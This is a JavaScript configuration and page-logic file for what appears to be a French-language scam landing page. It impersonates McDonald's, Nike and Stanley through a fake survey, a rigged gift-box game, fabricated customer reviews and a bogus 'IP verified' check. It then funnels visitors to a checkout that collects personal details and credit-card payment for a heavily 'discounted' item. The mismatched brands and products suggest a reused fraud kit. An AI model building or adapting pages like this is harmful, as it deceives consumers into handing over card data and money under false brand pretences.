const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "en";
  const lang = "en-EN";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Taille : ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };
  // JE REMPLIS CES INFORMATIONS DANS MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    text: `,
  Félicitations!<br><br>
  Vous avez participé à la promotion Stanley : vous avez l'opportunité d'acheter le thermos STANLEY QUENCHER H2.0 avec moule à glace pour seulement <b>37$</b>!
  `,
  };

  const notifications = [
    // {
    // 	user: "Manuel S*****",
    // 	location: "Barcelona, España",
    // 	action: "¡Acabo de recibir la joya por 1,95 euros!",
    // 	timeago: "hace 15 segundos",
    // },
    // {
    // 	user: "Carlos B******",
    // 	location: "Madrid, España",
    // 	action: "¡Acabo de recibir la joya por 1,95 euros!",
    // 	timeago: "hace 25 segundos",
    // },
  ];

  const reviewsArr = [
    {
      name: "Mateo",
      time: "Il y a un jour",
      header: "C'est incroyable !",
      product: "26468782",
      review: "En tant que fan de football depuis de nombreuses années, j'ai été très surpris par la qualité du maillot de l'équipe nationale d'Espagne à un prix très raisonnable 😊",
    },
    {
      name: "Lucas",
      time: "Il y a deux jours",
      header: "Génial ! Je n'ai pas de mots.",
      product: "26468789",
      review: "J'ai décidé d'acheter le maillot de l'équipe nationale d'Espagne pour la première fois et maintenant je l'apprécie chaque fois que je soutiens mon équipe, merci.",
    },
    {
      name: "Valentina",
      time: "Il y a deux jours",
      header: "Simplement génial.",
      product: "26468785",
      review: "La qualité du maillot est incroyable, et la taille est parfaite ! Merci, je le recommanderai à mes amis.",
    },
    {
      name: "Santiago",
      time: "Il y a quatre jours",
      header: "J'aime",
      review: "Honnêtement, j'adore regarder le football, et le nouveau maillot de l'équipe nationale d'Espagne était exactement ce dont j'avais besoin.",
    },
    {
      name: "Martina",
      time: "Il y a sept jours",
      header: "Waouh, j'adore ce produit !",
      product: "26468784",
      review: "Au début, je pensais que le maillot était cher, mais heureusement, je l'ai acheté et maintenant je profite des meilleurs matchs avec lui. Merci !",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "AVIS ET NOTES",
    percent: "99%",
    rec: "Commentaires sur cette promotion",
  };

  const questions = {
    _of: "Question {1} sur {2} : ",
    arr: [
      {
        q: "Avez-vous déjà commandé des produits McDonald's ?",
        a: [
          "Oui, je commande fréquemment",
          "Oui, je commande rarement",
          "Je n'ai jamais commandé",
        ],
      },
      {
        q: "McDonald's devrait-il continuer avec ce type de campagnes publicitaires ?",
        a: ["Oui, bien sûr !", "Oui, mais changez le menu promotionnel", "Non"],
      },
      {
        q: "Recommanderiez-vous nos produits à vos amis ?",
        a: ["Oui", "Non"],
      },
    ],
  };

  const check = {
    title: "Votre réponse sera examinée",
    arr: [
      "Vous avez répondu à la question 3 sur 3",
      "Votre adresse IP ne montre pas de commandes antérieures",
      "Votre réponse a été vérifiée",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Merci d'avoir participé à l'enquête !",
        button: "Tentez votre chance",
        text: `
  <center>
      Pour obtenir le menu promotionnel de McDonald's, vous devez choisir la bonne boîte cadeau.
      <br><br>
      Vous avez 3 tentatives, bonne chance !
  </center>
              `,
      },
    },
    first: {
      texts: {
        header: "Oh, non...",
        button: "Réessayez",
        text: `
  <center>
      Malheureusement, ce cadeau est vide. Il vous reste deux tentatives, bonne chance !
  </center>
              `,
      },
    },
    win: {
      texts: {
        header: "Angleterre (Équipe masculine) 2024/25 Maillot domicile du stade",
        button: "Obtenez le coupon",
        text: `
  <center>
      <p style="color: #ffffff"></p>
      <br>
      Cliquez sur "Obtenez le coupon", complétez le formulaire et payez la commande.
      <br><br>
      Recevez un SMS avec le coupon et des instructions pour l'activer.
      <br><br>
      Le coupon peut être activé à tout moment et ne nécessite aucun paiement supplémentaire.
  </center>
              `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informations personnelles",
      fields: {
        name: {
          enabled: true,
          field: "Prénom",
        },
        family: {
          enabled: true,
          field: "Nom de famille",
        },
        phone: {
          enabled: true,
          field: "Numéro de téléphone",
        },
        email: {
          enabled: true,
          field: "Adresse e-mail",
        },
      },
    },
    delivery: {
      title: "Livraison",
      fields: {
        city: {
          enabled: true,
          field: "Ville",
        },
        address: {
          enabled: true,
          field: "Adresse de livraison",
        },
        zip: {
          enabled: true,
          field: "Code postal",
        },
      },
    },
    payment: {
      title: "Méthodes de paiement",
      creditCard: "Paiement en ligne par carte de crédit",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Détails de la commande",
      oldPrice: "€99.99",
      newPrice: "€9.99",
      size: "Taille",
      subTotal: {
        title: "Sous-total",
        amount: "€9.99",
      },
      delivery: {
        title: "Livraison",
        amount: "€0.00",
      },
      total: {
        title: "Total",
        amount: "€9.99",
      },
      checkoutButton: "Payez votre commande",
    },
  };



  const products = [
    {
      id: "26468784",
      name: "FFF (Équipe Masculine) 2024/25 Match Domicile",
      miniImg: "./src/img/shirt-fr.jpg",
      images: ["./src/img/shirt-fr.jpg"],
    },
    {
      id: "26468782",
      name: "FFF (Équipe Masculine) 2024/25 Match Domicile",
      miniImg: "./src/img/shirt-fr.jpg",
      images: ["./src/img/shirt-fr.jpg"],
    },
    {
      id: "26468783",
      name: "FFF (Équipe Masculine) 2024/25 Match Domicile",
      miniImg: "./src/img/shirt-fr.jpg",
      images: ["./src/img/shirt-fr.jpg"],
    },
  ];

  const footer = {
    cr: "© 2024  Nike, Inc. Tous droits réservés",
  };

  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  // document
  //   .querySelector(".checkout_header")
  //   .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});